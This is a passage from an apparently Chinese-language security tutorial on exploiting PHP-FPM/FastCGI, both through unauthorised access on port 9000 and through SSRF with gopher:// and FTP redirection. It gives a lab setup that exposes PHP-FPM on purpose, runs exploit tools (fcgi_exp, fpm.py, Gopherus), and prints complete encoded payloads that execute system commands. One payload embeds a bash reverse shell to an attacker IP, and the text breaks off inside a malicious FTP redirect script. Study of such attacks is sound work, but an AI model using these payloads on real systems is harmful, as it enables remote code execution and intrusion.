        'SERVER_PORT': '80',
        'SERVER_NAME': "localhost",
        'SERVER_PROTOCOL': 'HTTP/1.1'
        'PHP_VALUE': 'auto_prepend_file = php://input',
        'PHP_ADMIN_VALUE': 'allow_url_include = On'
    }
设置 `auto_prepend_file = php://input` 且 `allow_url_include = On`，然后将我们需要执行的代码放在
Body 中，即可执行任意代码。
## PHP-FPM 未授权访问漏洞
前文我们讲到，攻击者可以通过 `PHP_VALUE` 和 `PHP_ADMIN_VALUE` 这两个环境变量设置 PHP 配置选项
`auto_prepend_file` 和 `allow_url_include` ，从而使 PHP-FPM
执行我们提供的任意代码，造成任意代码执行。除此之外，由于 PHP-FPM 和 Web 服务器中间件是通过网络进行沟通的，因此目前越来越多的集群将 PHP-FPM 直接绑定在公网上，所有人都可以对其进行访问。这样就意味着，任何人都可以伪装成Web服务器中间件来让 PHP-FPM
执行我们想执行的恶意代码。这就造成了 PHP-FPM 的未授权访问漏洞。
下面我们搭建环境，对 PHP-FPM 未授权访问漏洞的攻击过程进行讲解。
### 环境搭建
  * 靶 机：Ubuntu（192.168.0.175）
  * 攻击机：Kali（192.168.0.128）
这里直接在Ubuntu上安装Nginx和php-fpm，首先安装Nginx
    sudo apt-get install nginx
安装php、php-fpm以及一些插件
    sudo apt-get install software-properties-common python-software-properties 
    sudo add-apt-repository ppa:ondrej/php    # 这里容易卡死, 解决方法是挂代理
    sudo apt-get update
    sudo apt-get -y install php7.4
    sudo apt-get -y install php7.4-fpm php7.4-mysql php7.4-curl php7.4-json php7.4-mbstring php7.4-xml  php7.4-intl
### 配置 PHP-FPM
接下来我们需要修改 PHP-FPM 的配置，设置监听9000端口来处理nginx的请求，并将 PHP-FPM 暴露在 0.0.0.0 上面。
打开 `/etc/php/7.4/fpm/pool.d/www.conf` 文件找到如下位置，注释掉第一行并添加第二行：
    ;listen = /run/php/php7.4-fpm.sock
    listen = 0.0.0.0:9000
此时将 PHP-FPM 的监听地址设置为了 `0.0.0.0:9000`，便会产生PHP-FPM 未授权访问漏洞，此时攻击者可以直接与暴露在目标主机
9000 端口上的 PHP-FPM 进行通信，进而可以实现任意代码执行。
下面修改权限
    chmod 777 /run/php/php7.4-fpm.sock
打开nginx的配置文件 `/etc/nginx/sites-available/default` 修改相应部分的配置
    server {
        listen       80; #监听80端口，接收http请求
        server_name  www.example.com; #就是网站地址
        root /var/www/html; # 准备存放代码工程的路径
        #路由到网站根目录www.example.com时候的处理
        location / {
            index index.php; #跳转到www.example.com/index.php
            autoindex on;
        }  
        #当请求网站下php文件的时候，反向代理到php-fpm
        location ~ \.php$ {
            fastcgi_split_path_info ^(.+\.php)(/.+)$;
            fastcgi_pass 0.0.0.0:9000;#nginx fastcgi进程监听的IP地址和端口
            #fastcgi_pass unix:/run/php/php7.4-fpm.sock;
            fastcgi_index index.php;
            include fastcgi_params;
        }
    }
### 启动环境
配置完成后查看一下php-fpm的安装位置，然后启动
    whereis php-fpm
    /usr/sbin/php-fpm7.4    # 这是我的靶机上php-fpm安装的位置
重新启动Nginx
    sudo systemctl restart nginx
然后检查nginx是否正确启动 `systemctl status nginx`：
检查php-fpm是否正确启动 `ps -elf | grep php-fpm`
这里就可以看出上面所说的存在一个master进程和多个worker进程。
下面将 `/var/www/html` 目录下的文件删除，新建一个index.php，内容可以写上 ``
用来检查各项是否正常运行（如果页面为空，查看这篇[文章](https://blog.csdn.net/feiniao8651/article/details/52768911)解决）：
其中 Sever API 处和上图一样说明运行正确。下面我们开始攻击。
### 利用 fcgi_exp.go 攻击
  * 项目地址：
将该项目下载下来后，进入到 webcgi-exploits/php/Fastcgi，新建一个 fcgiclient 目录，将 fcgiclient.go
放入新建的 fcgiclient 目录中：
然后安装 go 环境进行编译：
    go build fcgi_exp.go                    # 编译fcgi_exp.go
然后直接运行可以看到 fcgi_exp 的使用方法：
使用如下命令进行测试
    ./fcgi_exp system 192.168.43.82 9000 /var/www/html/index.php "id"
  * system：要使用的PHP函数
  * 192.168.43.82：目标机IP
  * 9000：目标机 fpm 端口
  * /var/www/html/index.php：已知的位于目标机上的PHP文件
  * id：要执行的系统命令
如下图所示，成功执行系统命令，利用成功：
### 利用 phith0n 大神的 fpm.py
  * 项目地址：
>
> “兼容Python2和Python3，方便在内网用。之前好些人总是拿着一个GO写的工具在用，又不太好用。实际上理解了fastcgi协议，再看看这个源码，就很简单了。“
>
> ​ —— phith0n
利用方式：
    python fpm.py 192.168.43.82 /var/www/html/index.php -c ""
如下图所示，成功执行系统命令，利用成功：
## SSRF 中对 FPM/FastCGI 的攻击
有时候 PHP-FPM 也并不会执行绑定在 0.0.0.0 上面，而是 127.0.0.1，这样便避免了将 PHP-FPM
暴露在公网上被攻击者访问，但是如果目标主机上存在 SSRF 漏洞的话，我们便可以通过 SSRF 漏洞攻击内网的 PHP-FPM 。
  * 靶 机：Ubuntu（192.168.0.175）
  * 攻击机：Kali（192.168.0.128）
在目标机Web目录中新建 ssrf.php 文件，写入以下存在 SSRF 漏洞的代码：
此时目标主机存在 SSRF 漏洞，并且通过 SSRF 可以探测到目标主机上 9000 端口上运行的 php-fpm。此时，虽然 php-fpm
没有暴露在公网上，但是由于存在 SSRF 漏洞，我们便可以通过 SSRF 漏洞配合 Gopher 协议去打内网的 php-fpm。
### 利用 fcgi_exp 攻击
  * 项目地址：
刚在我们已经演示过了，fcgi_exp 这个工具主要是用来攻击未授权访问 php-fpm 的，所以一些地方需要自己写脚本转换一下 payload。
使用如下命令进行测试：
    ./fcgi_exp system 192.168.43.82 9000 /var/www/html/index.php "id"
此时显然是不行的，因为在配置端口监听的时候，仅允许监听在127.0.0.1，不存在 php-fpm 未授权访问，所以说不能攻击成功。我们要通过 SSRF
来从目标机内部攻击 9000 端口。
在攻击机上使用 `nc -lvvp 1234 > fcg_exp.txt` 监听1234 端口来接收 payload，另外开启一个终端使用下面的命令发送
payload
    ./fcgi_exp system 127.0.0.1 1234 /var/www/html/index.php "id"
注意这里攻击的端口是上面监听的端口，目的是将payload发送到这个端口，运行后可以使用Ctrl+C
来结束运行，现在就得到了一个fcg_exp.txt的文件，里面是获得的payload，可以使用 `xxd fcg_exp.txt` 查看其内容：
文件里的内容有部分是不可见字符，这里需要url编码一下，这里写一个Python脚本对文件中的内容进行编码
    # -*- coding: UTF-8 -*-    from urllib.parse import quote, unquote, urlencode
    file = open('fcg_exp.txt','r')
    payload = file.read()
    print("gopher://127.0.0.1:9000/_"+quote(payload).replace("%0A","%0D").replace("%2F","/"))
执行上面的python脚本生成如下payload：
    gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%14%04%00%0E%02CONTENT_LENGTH56%0E%04REQUEST_METHODPOST%09%5BPHP_VALUEallow_url_include%20%3D%20On%0Ddisable_functions%20%3D%20%0Dsafe_mode%20%3D%20Off%0Dauto_prepend_file%20%3D%20php%3A//input%0F%17SCRIPT_FILENAME/var/www/html/index.php%0D%01DOCUMENT_ROOT/%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%008%00%00%3C%3Fphp%20system%28%27id%27%29%3Bdie%28%27-----0vcdb34oju09b8fd-----%0D%27%29%3B%3F%3E
之后我们还要对上面的payload进行二次url编码，然后将最终的payload内容放到?url=后面发送过去（这里需要进行两次编码，因为这里GET会进行一次解码，curl也会再进行一次解码）：
    ssrf.php?url=gopher%3A//127.0.0.1%3A9000/_%2501%2501%2500%2501%2500%2508%2500%2500%2500%2501%2500%2500%2500%2500%2500%2500%2501%2504%2500%2501%2501%2514%2504%2500%250E%2502CONTENT_LENGTH56%250E%2504REQUEST_METHODPOST%2509%255BPHP_VALUEallow_url_include%2520%253D%2520On%250Ddisable_functions%2520%253D%2520%250Dsafe_mode%2520%253D%2520Off%250Dauto_prepend_file%2520%253D%2520php%253A//input%250F%2517SCRIPT_FILENAME/var/www/html/index.php%250D%2501DOCUMENT_ROOT/%250F%2510SERVER_SOFTWAREgo%2520/%2520fcgiclient%2520%250B%2509REMOTE_ADDR127.0.0.1%250F%2508SERVER_PROTOCOLHTTP/1.1%2500%2500%2500%2500%2501%2504%2500%2501%2500%2500%2500%2500%2501%2505%2500%2501%25008%2500%2500%253C%253Fphp%2520system%2528%2527id%2527%2529%253Bdie%2528%2527-----0vcdb34oju09b8fd-----%250D%2527%2529%253B%253F%253E
如下图所示，命令执行成功：
### 利用 Gopherus 攻击
  * 项目地址：
[Gopherus](https://github.com/tarunkant/Gopherus)
这个工具相比上一个更加方便一下，该工具能生成Gopher有效负载，用来利用SSRF进行RCE：
下面我们就利用这个工具来执行命令：
    python gopherus.py --exploit fastcgi
    /var/www/html/index.php                 # 这里输入的是一个已知存在的php文件
    id
如上图所示获得payload：
    gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%04%04%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%02CONTENT_LENGTH54%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%17SCRIPT_FILENAME/var/www/html/index.php%0D%01DOCUMENT_ROOT/%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%006%04%00%3C%3Fphp%20system%28%27id%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00
然后进行二次编码后将最终的payload内容放到?url=后面发送过去即可：
    /ssrf.php?url=gopher%3A%2F%2F127.0.0.1%3A9000%2F_%2501%2501%2500%2501%2500%2508%2500%2500%2500%2501%2500%2500%2500%2500%2500%2500%2501%2504%2500%2501%2501%2504%2504%2500%250F%2510SERVER_SOFTWAREgo%2520%2F%2520fcgiclient%2520%250B%2509REMOTE_ADDR127.0.0.1%250F%2508SERVER_PROTOCOLHTTP%2F1.1%250E%2502CONTENT_LENGTH54%250E%2504REQUEST_METHODPOST%2509KPHP_VALUEallow_url_include%2520%253D%2520On%250Adisable_functions%2520%253D%2520%250Aauto_prepend_file%2520%253D%2520php%253A%2F%2Finput%250F%2517SCRIPT_FILENAME%2Fvar%2Fwww%2Fhtml%2Findex.php%250D%2501DOCUMENT_ROOT%2F%2500%2500%2500%2500%2501%2504%2500%2501%2500%2500%2500%2500%2501%2505%2500%2501%25006%2504%2500%253C%253Fphp%2520system%2528%2527id%2527%2529%253Bdie%2528%2527-----Made-by-SpyD3r-----%250A%2527%2529%253B%253F%253E%2500%2500%2500%2500
如下图所示，命令执行成功：
## FTP - SSRF 攻击 FPM/FastCGI
这是在之前复现Laravel Debug mode RCE（CVE-2021-3129）漏洞时学到的一个思路。该漏洞的核心就是传入
file_get_contents() 和 file_put_contents() 这两个函数中的内容没有经过过滤，从而可以通过精巧的构造触发 phar
反序列化，达到RCE的效果。
漏洞代码大致可以简化为如下代码：
    & /dev/tcp/192.168.43.247/2333 0>&1"  # 这里输入的是要执行的命令
得到payload，而我们需要的是上面payload中 `_` 后面的数据部分，即：
    %01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%05%05%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%03CONTENT_LENGTH106%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%17SCRIPT_FILENAME/var/www/html/index.php%0D%01DOCUMENT_ROOT/%00%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00j%04%00%3C%3Fphp%20system%28%27bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/192.168.43.247/2333%200%3E%261%22%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00
在攻击机上设置好nc监听：
然后编写如下脚本（脚本是从网上扒的，谁叫我菜呢，大佬勿喷~~），在攻击机上搭建一个恶意的ftp服务，并将上面的payload中的数据替换掉下面ftp脚本中的payload的内容：
    # -*- coding: utf-8 -*-    # @Time    : 2021/1/13 6:56 下午
    # @Author  : tntaxin
    # @File    : ftp_redirect.py
    # @Software:
    import socket
    from urllib.parse import unquote
    # 对gopherus生成的payload进行一次urldecode